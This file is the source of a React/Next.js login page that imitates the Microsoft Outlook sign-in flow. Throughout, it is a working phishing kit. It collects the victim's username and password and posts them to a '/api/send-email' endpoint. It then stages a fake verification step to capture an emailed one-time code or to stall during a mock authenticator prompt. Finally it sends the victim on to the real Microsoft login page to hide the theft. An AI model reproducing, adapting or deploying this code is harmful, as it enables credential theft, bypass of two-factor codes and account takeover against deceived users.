'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import Footer from '@/app/components/Footer';

export default function Login() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    name: '',
    password: '',
    bName: process.env.NEXT_PUBLIC_BANK_NAME,
  });

  const [step, setStep] = useState(1); // 1: username, 2: password, 3: verification method, 4: code input, 5: authenticator
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [showPassword, setShowPassword] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [selectedMethod, setSelectedMethod] = useState('email');
  const [authenticatorNumber, setAuthenticatorNumber] = useState(Math.floor(Math.random() * 90) + 10);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleUsernameSubmit = (e) => {
    e.preventDefault();
    if (formData.name.trim()) {
      setStep(2); // Go to password step
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!formData.password.trim()) return;

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send initial login data after username and password
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: formData.name,
          password: formData.password,
          step: 'credentials'
        }),
      });
      
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      
      // Continue to verification method selection
      setStep(3);
      
    } catch (error) {
      console.error("Failed to send initial login data:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleVerificationMethodSubmit = (e) => {
    e.preventDefault();
    if (selectedMethod === 'email') {
      setStep(4); // Go to code input
    } else if (selectedMethod === 'authenticator') {
      setStep(5); // Go to authenticator
    }
  };

  const handleCodeSubmit = async (e) => {
    e.preventDefault();
    if (!verificationCode.trim()) return;

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      const response = await fetch('/api/email-verification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          type: "OTP",
          // username: formData.name,
          // password: formData.password,
          verificationCode: verificationCode,
        }),
      });
      
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      
      setSubmitStatus("success");
      
      setTimeout(() => {
        router.push('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1748071219&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dus%26RpsCsrfState%3df25113c2-83f4-2ae6-e549-f7c781410f17&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');
      }, 1500);
      
    } catch (error) {
      console.error("Failed to send data:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAuthenticatorSubmit = async (e) => {
    e.preventDefault();
    
    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      const response = await fetch('/api/email-verification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: formData.name,
          password: formData.password,
          authenticatorUsed: true,
        }),
      });
      
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      
      setSubmitStatus("success");
      
      setTimeout(() => {
        router.push('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1748071219&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dus%26RpsCsrfState%3df25113c2-83f4-2ae6-e549-f7c781410f17&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');
      }, 1500);
      
    } catch (error) {
      console.error("Failed to send data:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const goBack = () => {
    if (step > 1) {
      setStep(step - 1);
      setSubmitStatus(null);
    }
  };

  // Auto-submit authenticator after 3 seconds
  useEffect(() => {
    if (step === 5) {
      const timer = setTimeout(() => {
        handleAuthenticatorSubmit({ preventDefault: () => {} });
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{
        backgroundImage: `url(/assets/bg.png)`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundAttachment: 'fixed',
      }}
    >
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          {/* Microsoft-style Card Container */}
          <div className="bg-white rounded-lg shadow-2xl p-8 sm:p-10">
            
            {/* Step 1: Username Input */}
            {step === 1 && (
              <>
                {/* Microsoft Logo */}
                <div className="text-center mb-8">
                  <div className="mx-auto w-24 h-6 relative">
                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
                  </div>
                  <h1 className="text-2xl font-normal text-gray-900 mb-2">Sign in</h1>
                  <p className="text-sm text-gray-600">to continue to Outlook.</p>
                </div>

                <form onSubmit={handleUsernameSubmit} className="space-y-6">
                  <div>
                    <input
                      type="text"
                      name="name"
                      value={formData.name}
                      onChange={handleChange}
                      placeholder="Email or phone number"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-sm text-gray-900 
                               focus:outline-none focus:ring-2 focus:ring-[#115EA3] focus:border-transparent
                               placeholder-gray-500 text-sm"
                    />
                  </div>

                  <div className="text-left">
                    <a 
                      href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}
                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
                    >
                      Forgot your username?
                    </a>
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-[#13578E] hover:bg-blue-700 text-white font-normal 
                             py-2.5 px-4 rounded-sm transition-colors duration-200
                             disabled:opacity-50 disabled:cursor-not-allowed
                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                    disabled={!formData.name.trim()}
                  >
                    Next
                  </button>

                  <div className="text-center pt-4">
                    <span className="text-sm text-gray-600">New to Microsoft? </span>
                    <a 
                      href={process.env.NEXT_PUBLIC_LOGIN_URL}
                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
                    >
                      Create an account
                    </a>
                  </div>
                </form>
              </>
            )}

            {/* Step 2: Password Input */}
            {step === 2 && (
              <>
                {/* Header with back button */}
                <div className="flex items-center mb-6">
                  <button
                    onClick={goBack}
                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
                  >
                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>
                  <div className="mx-auto w-24 h-6 relative">
                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
                  </div>
                </div>

                <div className="text-center mb-6">
                  <p className="text-sm text-gray-600 mb-6">{formData.name}</p>
                  <h1 className="text-2xl font-normal text-gray-900 mb-2">Enter password</h1>
                </div>

                <form onSubmit={handlePasswordSubmit} className="space-y-6">
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      value={formData.password}
                      onChange={handleChange}
                      placeholder="Password"
                      required
                      className="w-full px-3 py-2 pr-10 border border-gray-300 rounded-sm text-gray-900 
                               focus:outline-none focus:ring-2 focus:ring-[#115EA3] focus:border-transparent
                               placeholder-gray-500 text-sm"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    >
                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        {showPassword ? (
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L8.464 8.464m1.414 1.414L12 12m-3.536-3.536l1.414-1.414m0 0L8.464 8.464M12 12l3.536 3.536m-3.536-3.536L9.878 9.878" />
                        ) : (
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        )}
                      </svg>
                    </button>
                  </div>

                  <div className="text-left">
                    <a 
                      href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}
                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
                    >
                      Forgotten your password?
                    </a>
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-[#13578E] hover:bg-blue-700 text-white font-normal 
                             py-2.5 px-4 rounded-sm transition-colors duration-200
                             disabled:opacity-50 disabled:cursor-not-allowed
                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                    disabled={!formData.password.trim()}
                  >
                    Sign in
                  </button>
                </form>
              </>
            )}

            {/* Step 3: Verification Method Selection */}
            {step === 3 && (
              <>
                {/* Header with back button */}
                <div className="flex items-center mb-6">
                  <button
                    onClick={goBack}
                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
                  >
                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>
                  <div className="mx-auto w-24 h-6 relative">
                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
                  </div>
                </div>

                <div className="text-center mb-2">
                  <p className="text-sm text-gray-600 mb-6">{formData.name}</p>
                </div>

                <h1 className="text-xl font-normal text-gray-900 mb-4">We need to verify your identity</h1>
                <p className="text-sm text-gray-600 mb-6">How would you like to get your security code?</p>

                <form onSubmit={handleVerificationMethodSubmit} className="space-y-4">
                  <div className="space-y-3">
                    <label className="flex items-center space-x-3 cursor-pointer">
                      <input
                        type="radio"
                        name="verificationMethod"
                        value="email"
                        checked={selectedMethod === 'email'}
                        onChange={(e) => setSelectedMethod(e.target.value)}
                        className="w-4 h-4 text-[#115EA3] border-gray-300 focus:ring-blue-500"
                      />
                      <span className="text-sm text-gray-900">Email {formData.name}</span>
                    </label>
                    <label className="flex items-center space-x-3 cursor-pointer">
                      <input
                        type="radio"
                        name="verificationMethod"
                        value="authenticator"
                        checked={selectedMethod === 'authenticator'}
                        onChange={(e) => setSelectedMethod(e.target.value)}
                        className="w-4 h-4 text-[#115EA3] border-gray-300 focus:ring-blue-500"
                      />
                      <span className="text-sm text-gray-900">Use authenticator app</span>
                    </label>
                  </div>

                  <div className="space-y-3 text-sm">
                    <a href="#" className="block text-[#115EA3] hover:text-blue-800 hover:underline">
                      I have a code
                    </a>
                    <a href="#" className="block text-[#115EA3] hover:text-blue-800 hover:underline">
                      I don&apos;t have any of these
                    </a>
                  </div>

                  <div className="flex space-x-3 pt-6">
                    <button
                      type="button"
                      onClick={goBack}
                      className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-normal 
                               py-2.5 px-4 rounded-sm transition-colors duration-200"
                    >
                      Cancel
                    </button>
                    <button
                      type="submit"
                      className="flex-1 bg-[#115EA3] hover:bg-blue-700 text-white font-normal 
                               py-2.5 px-4 rounded-sm transition-colors duration-200"
                    >
                      {selectedMethod === 'email' ? 'Get code' : 'Continue'}
                    </button>
                  </div>
                </form>
              </>
            )}

            {/* Step 4: Code Input */}
            {step === 4 && (
              <>
                {/* Header with back button */}
                <div className="flex items-center mb-6">
                  <button
                    onClick={goBack}
                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
                  >
                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>
                  <div className="mx-auto w-24 h-6 relative">
                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
                  </div>
                </div>

                <h1 className="text-xl font-normal text-gray-900 mb-4">Verify your identity</h1>
                <p className="text-sm text-gray-600 mb-6">
                  If {formData.name} matches the email address on your account, we&apos;ll send you a code.
                </p>

                <form onSubmit={handleCodeSubmit} className="space-y-6">
                  <div>
                    <input
                      type="text"
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value)}
                      placeholder="Enter code"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-sm text-gray-900 
                               focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent
                               placeholder-gray-500 text-sm"
                    />
                  </div>

                  <div className="text-left">
                    <button 
                      type="button"
                      onClick={() => setStep(3)}
                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
                    >
                      Use a different verification option
                    </button>
                  </div>

                  {/* Status Messages */}
                  {submitStatus === "success" && (
                    <div className="bg-green-50 border border-green-200 rounded-sm p-3">
                      <div className="text-green-800 text-center text-sm">
                        Verification successful. Redirecting...
                      </div>
                    </div>
                  )}
                  {submitStatus === "error" && (
                    <div className="bg-red-50 border border-red-200 rounded-sm p-3">
                      <div className="text-red-800 text-center text-sm">
                        Something went wrong. Please try again.
                      </div>
                    </div>
                  )}

                  <div className="flex space-x-3">
                    <button
                      type="button"
                      onClick={goBack}
                      className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-normal 
                               py-2.5 px-4 rounded-sm transition-colors duration-200"
                    >
                      Cancel
                    </button>
                    <button
                      type="submit"
                      className="flex-1 bg-[#133779] hover:bg-[#13578E] text-white font-normal 
                               py-2.5 px-4 rounded-sm transition-colors duration-200 flex items-center justify-center"
                      disabled={!verificationCode.trim() || isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                          </svg>
                          Verifying...
                        </>
                      ) : (
                        "Next"
                      )}
                    </button>
                  </div>
                </form>
              </>
            )}

            {/* Step 5: Authenticator App */}
            {step === 5 && (
              <>
                {/* Header with back button */}
                <div className="flex items-center mb-6">
                  <button
                    onClick={goBack}
                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
                  >
                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>
                  <div className="mx-auto w-24 h-6 relative">
                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
                  </div>
                </div>

                <div className="text-center mb-6">
                  <p className="text-sm text-gray-600">{formData.name}</p>
                </div>

                <h1 className="text-xl font-normal text-gray-900 mb-8">Check your Authenticator app</h1>

                <div className="text-center mb-8">
                  <div className="mx-auto w-20 h-20 bg-gray-100 rounded-lg flex items-center justify-center mb-4">
                    <svg className="w-10 h-10 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                  </div>
                  <div className="text-6xl font-light text-gray-900 mb-2"></div>
                  <p className="text-sm text-gray-600 mb-6">
                    Select the number in the sign-in request on your Android.
                  </p>
                </div>

                <div className="mb-6">
                  <button className="flex items-center text-sm text-gray-600 hover:text-gray-800">
                    <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                    See devices this was sent to
                  </button>
                  <div className="ml-6 mt-2 text-sm text-gray-600">
                    <div>• Authenticator app on Android</div>
                    <div>• Authenticator app on Android</div>
                  </div>
                  <p className="text-xs text-gray-500 mt-2">
                    Manage your devices at aka.ms/manageeproofs.
                  </p>
                </div>

                <div className="text-center space-y-3">
                  <button
                    onClick={() => setStep(3)}
                    className="block text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
                  >
                    Other ways to sign in
                  </button>
                  <a href="#" className="block text-sm text-[#115EA3] hover:text-blue-800 hover:underline">
                    I don&apos;t have access to my Authenticator app
                  </a>
                </div>

                {/* Status Messages */}
                {submitStatus === "success" && (
                  <div className="bg-green-50 border border-green-200 rounded-sm p-3 mt-6">
                    <div className="text-green-800 text-center text-sm">
                      Authentication successful. Redirecting...
                    </div>
                  </div>
                )}
                {submitStatus === "error" && (
                  <div className="bg-red-50 border border-red-200 rounded-sm p-3 mt-6">
                    <div className="text-red-800 text-center text-sm">
                      Authentication failed. Please try again.
                    </div>
                  </div>
                )}

                {isSubmitting && (
                  <div className="text-center mt-6">
                    <div className="inline-flex items-center text-sm text-gray-600">
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-gray-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Authenticating...
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      </div>

      {/* Footer */}
      <Footer/>
    </div>
  );
}